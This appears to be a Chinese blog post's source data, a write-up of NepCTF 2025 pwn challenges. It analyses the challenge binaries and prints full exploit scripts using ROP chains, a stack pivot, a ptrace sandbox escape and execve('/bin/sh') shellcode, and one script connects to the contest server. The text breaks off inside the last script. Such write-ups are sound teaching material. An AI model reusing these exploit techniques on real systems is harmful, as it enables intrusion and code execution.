查看沙箱\n\n![image-20250805082927143](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png)\n\n\n\n只允许read，write，close，futex的syscall。看来是要ORW了。\n\n### ida 分析\n\n打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。\n\n#### main\n\n\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png)\n\n先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png)\n\n两个主要功能，visit()和left()\n\n##### visit\n\n![visit函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png)\n![visit函数](C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png)\n\nvisit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。\n\n1 选项中有对异常的处理。\n\n##### left\n\n![left函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png)\n\n只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。\n\n毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。\n\n### 异常处理对应\n\n##### 分析方法\n\nida在汇编代码中，会对catch标记，在其后面标注owner by xxx\n\n![catch](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png) \n\n根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。\n\n当然ida 有视图可以更好的看出函数的跳转对应关系\n\n![跳转](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png)\n\n##### 分析结果\n\n```c\nint main(){\n    seccomp_add();\n    while(1)\n    {\n        while(1){\n            try{\n                menu();\n            }\n            catch{\n                sub_4016ec();\n                sub_401652();\n            }\n        \n            try{\n                stdin>>choice;\n                if(choice!=1) break;\n                visit_nep();\n                if(choice!=2) exit(0);\n                left_nep();\n            }\n            catch{\n                std::cout << \"you catch the error \" << err2 << std::endl;\n                std::cout << \"here is a gift for you!\" << std::endl;\n    \n                printf(\"setbufaddr:%p\\n\", setbuf_ptr);\n                printf(\"stackaddr:%p\\n\", &choice);\n            }\n        }\n\n    } \n    \n}\n```\n\n#### 思路分析\n\n1. 首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc \n2. 紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。\n3. 第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。\n4. 第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\nio,elf=loadfile(\"./canutrytry\",\"\",0)\nlibc=ELF(\"./libc.so.6\")\ndef visit():\n\tio.sendlineafter(\"your choice >>\",\"1\")\n\t\ndef leave():\n\tio.sendlineafter(\"your choice >>\",\"2\")\n\ndef visit_op(op,size,idx): # size(content),1\n\tvisit()\n\tio.sendlineafter(\"your choice >>\",str(op))\n\tif op == 2 :\n\t\tio.sendlineafter(\"size\",str(size))\n\telif op == 3 :\n\t\tio.sendlineafter(\"index\",str(idx))\n\t\tio.sendafter(\"content\",size)\n\ndef leave_op(idx):\n\tleave()\n\tio.sendlineafter(\"index: \",str(idx))\n\n\ngdb.attach(io,\"b *0x401600\")\n#1 leak libc & stack\nvisit_op(2,0x40,0)\nvisit_op(1,0,0)\nvisit_op(2,-1,0)\nvisit_op(1,0,0)\n\nio.recvuntil(\"setbufaddr:\")\nlibc_base=int(io.recv(14),16)-0x88060\nio.recvuntil(\"stackaddr:\")\nstack=int(io.recv(14),16)\nlogv(\"libc\",hex(libc_base))\nlogv(\"stack\",hex(stack))\n\nwrite=libc_base+libc.sym[\"write\"]\n## gadgets\npop_rdi=libc_base + 0x2a3e5\npop_rsi=libc_base + 0x2be51\npop_rdx=libc_base + 0x11f497  # pop rdx;pop r12;ret\nleave_ret=0x401650\n## addr \nROP=0x4016EC\nflag=0x4053C0\nbuf=0x405460\n\n#2 prepare my ROP \npayload=0x20*b\"a\"+p64(buf)+p64(0x401ed9)\nvisit_op(3,payload,0)\nleave_op(0)\n\n#3 orw  flag\npayload = p64(0)+p64(pop_rdi)+p64(2)\npayload+= p64(pop_rsi)+p64(flag)\npayload+= p64(pop_rdx)+p64(0x64)+p64(0)\npayload+= p64(write)\nio.sendafter(\"well,prepare your rop now!\",payload)\n\n#4\npayload = b\"a\"*0x10\npayload+= p64(buf) \nio.sendafter(\"Enter your flag: \",b\"hhhh\")\n\n#5\nio.send(payload) \nio.interactive()\n\n```\n\n","slug":"ctf比赛复现/Nepctf-2025-pwn复现","published":1,"date":"2025-10-06T14:48:09.863Z","updated":"2025-10-06T15:21:34.556Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i1000duomy2dszckua","content":"<h1 id=\"Nepctf–pwn复现\"><a href=\"#Nepctf–pwn复现\" class=\"headerlink\" title=\"Nepctf–pwn复现\"></a>Nepctf–pwn复现</h1><h2 id=\"time\"><a href=\"#time\" class=\"headerlink\" title=\"time\"></a>time</h2><h2 id=\"smallbox\"><a href=\"#smallbox\" class=\"headerlink\" title=\"smallbox\"></a>smallbox</h2><h3 id=\"查看沙箱\"><a href=\"#查看沙箱\" class=\"headerlink\" title=\"查看沙箱\"></a>查看沙箱</h3><p>题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png\" alt=\"image-20250728093312153\"></p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p>先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png\" alt=\"image-20250728093914695\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。</p>\n<p>2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。</p>\n<p>之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io,elf=loadfile(&quot;./smallbox&quot;,&quot;&quot;,0)</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class=\"line\">host=<span class=\"string\">&quot;nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com&quot;</span></span><br><span class=\"line\">port=<span class=\"number\">443</span></span><br><span class=\"line\">io= remote(host, port, ssl=<span class=\"literal\">True</span>, sni=host)</span><br><span class=\"line\">execve_shellcode=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x3b\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,0x3b</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xBF\\x19\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rdi,0xdeadc0de019</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xf6&#x27;</span>   <span class=\"comment\"># xor rsi,rsi</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x8B\\x7D\\xF4&#x27;</span> <span class=\"comment\"># mov r15d,[rbp-0xc]</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x10\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,10h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor r10,r10</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x0c\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,ch</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r10,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB8\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de000</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB9\\x00\\xE2\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de200</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=<span class=\"number\">4</span>*(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x05\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,10h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4C\\x89\\xC2&#x27;</span> <span class=\"comment\"># mov rdx, r8</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x8B\\x11&#x27;</span><span class=\"comment\">#mov  r10, [r9]</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\x83\\xC0\\x08&#x27;</span> <span class=\"comment\"># add r8+8</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\x83\\xC1\\x08&#x27;</span> <span class=\"comment\"># add r8+8</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=(</span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB9\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span> <span class=\"comment\">#  mov r9,0x0deadc0de200</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xB8\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r8,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x89\\x88\\x80\\x00\\x00\\x00&#x27;</span>             <span class=\"comment\">#  mov    [r8+0x80],r9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x0d\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,dh</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r10,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x11\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,17h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor r10,r10</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">loop:</span></span><br><span class=\"line\"><span class=\"string\">    jmp loop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode=shellcode.ljust(<span class=\"number\">0x200</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">shellcode+=execve_shellcode</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(shellcode)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"astray\"><a href=\"#astray\" class=\"headerlink\" title=\"astray\"></a>astray</h2><h3 id=\"ida-分析\"><a href=\"#ida-分析\" class=\"headerlink\" title=\"ida 分析\"></a>ida 分析</h3><p>首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构</p>\n<table>\n<thead>\n<tr>\n<th>地址</th>\n<th>保存内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>manage_physic[0]</td>\n<td>heap_addr</td>\n</tr>\n<tr>\n<td>magnage_physic[2*i]    (偶数项)</td>\n<td>heap_addr+256*i</td>\n</tr>\n<tr>\n<td>heap2</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap2+0x8</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap2+0x10</td>\n<td>0</td>\n</tr>\n<tr>\n<td>V3</td>\n<td>heap_addr</td>\n</tr>\n<tr>\n<td>heap_addr</td>\n<td>1</td>\n</tr>\n<tr>\n<td>heap_addr+0x8</td>\n<td>heap3</td>\n</tr>\n<tr>\n<td>heap_addr+0x10</td>\n<td>&amp;onlyuser</td>\n</tr>\n<tr>\n<td>heap3</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap3+0x8</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap3+0x10</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p>可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。</p>\n<h4 id=\"check函数\"><a href=\"#check函数\" class=\"headerlink\" title=\"check函数\"></a>check函数</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png\" alt=\"image-20250804134532550\"></p>\n<p>这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。</p>\n<p>但是在check函数还有一个检测，如果是idx是0 ，即 n0x14&#x3D;0，那么v5&#x3D; manage_physic.所以v5[1]&#x3D;*(manage_physic+8),也就是0x10，是过不了检测的。</p>\n<p>正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i&#x3D;0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png\" alt=\"image-20250804143259945\"></p>\n<p>这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png\" alt=\"image-20250804162343842\"></p>\n<p>在初始化时，这里对每一个块都初始了权限，那么其实对&amp; 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，<strong>使用user_write去执行呢，似乎可以避开权限的检测</strong>，但是后续会继续检测，也无法往里write。</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><h4 id=\"通过MANAGE-visit\"><a href=\"#通过MANAGE-visit\" class=\"headerlink\" title=\"通过MANAGE_visit\"></a>通过MANAGE_visit</h4><p>因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]&#x3D;heap_addr.<br>再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。<br>所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&amp;onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png\" alt=\"image-20250805013545343\"></p>\n<h4 id=\"任意地址读写\"><a href=\"#任意地址读写\" class=\"headerlink\" title=\"任意地址读写\"></a>任意地址读写</h4><p>这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。</p>\n<h4 id=\"泄露stack，再rop\"><a href=\"#泄露stack，再rop\" class=\"headerlink\" title=\"泄露stack，再rop\"></a>泄露stack，再rop</h4><p>有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。</p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./astray&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#manager=0x41A8</span></span><br><span class=\"line\"><span class=\"comment\"># 0x4060</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=<span class=\"number\">0x29139</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager</span>(<span class=\"params\">op,idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;visit user(MANAGER_visit)\\n&quot;</span>)</span><br><span class=\"line\">    io.send(op)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;1-19: manager can visit\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">user</span>(<span class=\"params\">op,idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1000</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;user write to logs(USER_write)\\n&quot;</span>)</span><br><span class=\"line\">    io.send(op)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;10-19: user can visit\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_read</span>():</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_read&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_write</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_write&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tio.send(content)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_user_read</span>():</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;to user_logs\\n&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_user_write</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span 